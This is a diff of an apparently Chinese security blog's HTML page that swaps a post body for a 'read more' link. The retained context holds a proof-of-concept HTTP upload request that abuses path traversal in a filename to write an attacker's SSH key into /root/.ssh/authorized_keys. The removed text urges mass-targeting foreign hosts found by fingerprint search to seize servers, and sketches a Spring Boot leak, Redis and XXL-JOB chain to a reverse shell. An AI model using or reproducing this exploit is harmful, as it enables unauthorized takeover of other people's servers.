@@ -233,7 +233,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-09-13 09:59:30" itemprop="dateModified" datetime="2023-09-13T09:59:30+08:00">2023-09-13</time>
+                <time title="修改时间：2023-09-13 10:13:23" itemprop="dateModified" datetime="2023-09-13T10:13:23+08:00">2023-09-13</time>
               </span>
 
           <br>
@@ -267,36 +267,14 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa </span><br><span class="line">cat /root/.ssh/id_rsa.pub    #可以拿来用啦</span><br></pre></td></tr></table></figure>
 
 <p>poc如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST /upload/UploadServlet HTTP/1.1</span><br><span class="line">Content-Length: 1283</span><br><span class="line">Content-Type: multipart/form-data; boundary=8mR-ztMG5r-q5b7yp-IaAs20oaFQVH</span><br><span class="line">Host: 码码码码码码码码码码码码码码</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line"></span><br><span class="line">--8mR-ztMG5r-q5b7yp-IaAs20oaFQVH</span><br><span class="line">Content-Disposition: form-data; name=&quot;access_token&quot;</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line"></span><br><span class="line">5d64e94b10e14025a234c4f6870c38e0</span><br><span class="line">--8mR-ztMG5r-q5b7yp-IaAs20oaFQVH</span><br><span class="line">Content-Disposition: form-data; name=&quot;validTime&quot;</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line"></span><br><span class="line">1.0</span><br><span class="line">--8mR-ztMG5r-q5b7yp-IaAs20oaFQVH</span><br><span class="line">Content-Disposition: form-data; name=&quot;userId&quot;</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line"></span><br><span class="line">10002341</span><br><span class="line">--8mR-ztMG5r-q5b7yp-IaAs20oaFQVH</span><br><span class="line">Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;../../../../../../../../../../../../../../../../../../../root/.ssh/authorized_keys&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">Content-Transfer-Encoding: binary</span><br><span class="line"></span><br><span class="line">ssh-rsa AAAAB3NzaC此处是自己这边生成的密钥文件，上传这个authorized_keys可轻松实现免密登录LbGM= root@kali</span><br></pre></td></tr></table></figure>
-
-<p>但是想要扒拉东西的话，这样很慢，上winscp免密登录比较好一些</p>
-<p>搭配fofa指纹批量，目标只要对准国外主机，分分钟拥有一堆国外的公网服务器</p>
-<p>你的下一台主机，何必花钱是买来的？（狗头保命）</p>
-<p>这个是有一定概率不成功的，比如根本没这个目录、比如根本没开这个端口、比如权限问题等等</p>
-<p>大部分还是能成的</p>
-<h2 id="日常2-springboot信息泄露-redis未授权-XXL-JOB反弹shell"><a href="#日常2-springboot信息泄露-redis未授权-XXL-JOB反弹shell" class="headerlink" title="日常2  springboot信息泄露+redis未授权+XXL-JOB反弹shell"></a>日常2  springboot信息泄露+redis未授权+XXL-JOB反弹shell</h2><p>32位的弱口令泄露 爱来自/env目录 </p>
-<p>登上去后搜到了Redis和MySQL数据库密码</p>
-<p><img src="/2023/08/02/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E6%88%98%E6%97%A5%E5%B8%B8/1.png"></p>
-<p>32位，看起来很复杂，对8？在复杂他也是弱口令</p>
-<p>搭配扫描工具还发现个XXL-JOB系统  密码不是admin 123456这种的，那就先不管</p>
-<p>连上两个数据库，发现其中一个存的有这个XXL-JOB的账号信息</p>
-<p><img src="/2023/08/02/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E6%88%98%E6%97%A5%E5%B8%B8/2.png"></p>
-<p>md5解开来是111111  反正这个也不需要验证码也没有次数限制，爆破也是可以的，只不过爆破实属下下策，不建议考虑</p>
-<p>后续就是已知公开的漏洞，计划任务公网弹shell</p>
-<p>在后面，你懂得（狗头保命）</p>
-<h2 id="日常3-为啥密码直接在js文件里能搜到啊？"><a href="#日常3-为啥密码直接在js文件里能搜到啊？" class="headerlink" title="日常3   为啥密码直接在js文件里能搜到啊？"></a>日常3   为啥密码直接在js文件里能搜到啊？</h2><p>我不理解 打开js文件搜一下password 用户名和密码全给出来了</p>
-<p>比如这样↓↓↓</p>
-<p><img src="/2023/08/02/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E6%88%98%E6%97%A5%E5%B8%B8/3.png"></p>
-<p>还有这种好事？还真有这种好事…… </p>
-<p><img src="/2023/08/02/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E6%88%98%E6%97%A5%E5%B8%B8/4.png"></p>
-<p>好事，好事，好事啊</p>
-<p>遇见一回两回就算了，遇见太多回了所以单独拎出来写一下，也许这是一处非凡的突破口。</p>
-<p>每个人渗透习惯不同，有的人可能就发现不了，反正我是会偶尔扒拉一下js文件的。</p>
-<hr>
-<blockquote>
-<p>无论何时放弃都不是最好的选择，坚持才是</p>
-</blockquote>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/08/02/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E6%88%98%E6%97%A5%E5%B8%B8/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
